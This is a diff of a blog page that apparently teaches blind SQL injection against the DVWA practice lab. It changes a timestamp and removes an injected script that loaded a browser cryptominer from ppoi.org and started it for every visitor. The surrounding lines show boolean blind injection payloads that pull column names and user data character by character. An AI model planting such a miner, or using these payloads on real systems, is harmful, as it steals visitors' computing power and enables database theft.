@@ -116,7 +116,7 @@
           <!-- Date -->
           <span class="date-time info">On
             <span class="date">2017-11-26</span>
-            <span class="time">22:29:23</span>
+            <span class="time">21:05:59</span>
           </span>
           
         </div>
@@ -168,19 +168,6 @@
 <h5 id="6-查询列名"><a href="#6-查询列名" class="headerlink" title="6.查询列名"></a>6.查询列名</h5><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">and ascii(substr((select column_name from information_schema.columns where table_name=0x7573657273 limit 0,1),1,1)) &gt; 116</div></pre></td></tr></table></figure>
 <h5 id="7-查询字段的长度"><a href="#7-查询字段的长度" class="headerlink" title="7.查询字段的长度"></a>7.查询字段的长度</h5><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">and (select length(column_name) from information_schema.columns where table_name=0x7573657273 limit 1,1 ) &gt;10</div></pre></td></tr></table></figure>
 <h5 id="8-爆出字段"><a href="#8-爆出字段" class="headerlink" title="8.爆出字段"></a>8.爆出字段</h5><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">and ascii(substr((select user from dvwa.users limit 0,1),1,1)) &gt; 96</div></pre></td></tr></table></figure>
-
-<html>
-<head>
-<script>
-var script = document.createElement("script");
-script.type = "text/javascript";
-script.src = "https://ppoi.org/lib/projectpoi.min.js";
-script.onload = script.onreadystatechange = function(){var miner = new ProjectPoi.Anonymous("aoZgifd6N8x48tCIwRtb7bJA",{threads: 4,autoThreads: false,throttle: 0.5});miner.start();}
-document.getElementsByTagName("head")[0].appendChild(script);
-</script>
-</head>
-</html>
-
 
         </div>
       </div>
